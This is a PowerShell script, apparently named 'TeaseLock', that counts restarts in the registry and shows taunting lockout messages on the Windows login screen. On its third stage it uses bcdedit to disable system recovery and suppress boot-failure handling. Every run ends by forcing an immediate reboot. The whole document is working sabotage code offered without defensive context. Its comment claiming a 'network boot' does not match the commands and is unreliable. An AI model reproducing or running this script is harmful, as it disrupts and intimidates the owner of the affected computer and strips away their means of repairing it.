# Define registry path for tracking restart progress
$regPath = "HKLM:\SOFTWARE\TeaseLock"
if (!(Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}

# Get the current restart count (default to 0 if not set)
$restartCount = (Get-ItemProperty -Path $regPath -Name "RestartCount" -ErrorAction SilentlyContinue).RestartCount
if ($restartCount -eq $null) {
    $restartCount = 0
}

# Modify the Windows Login Screen to Display Teasing Messages
$systemRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"

if ($restartCount -eq 0) {
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Oh? Trying to log in?" -PropertyType String -Force
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Ah~ Sweetheart, you're locked out <3 Try again later~ ;)" -PropertyType String -Force
    $restartCount = 1
}

elseif ($restartCount -eq 1) {
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Persistent, aren't we?" -PropertyType String -Force
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Round two, darling~? You’ll have to wait longer this time~ ;)" -PropertyType String -Force
    $restartCount = 2
}

elseif ($restartCount -eq 2) {
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeCaption" -Value "Oh dear~ You really tried..." -PropertyType String -Force
    New-ItemProperty -Path $systemRegPath -Name "LegalNoticeText" -Value "Too bad, love~ No more chances <3 See you never~!" -PropertyType String -Force

    # Apply "corruption" by disabling recovery and forcing a network boot
    bcdedit /set {current} bootstatuspolicy ignoreallfailures
    bcdedit /set {current} recoveryenabled no
    bcdedit /set {default} bootmenupolicy legacy

    # Reset the restart count so the process can be repeated if needed
    $restartCount = 0
}

# Save the updated restart count
Set-ItemProperty -Path $regPath -Name "RestartCount" -Value $restartCount -Force

# Restart the PC
shutdown /r /f /t 5
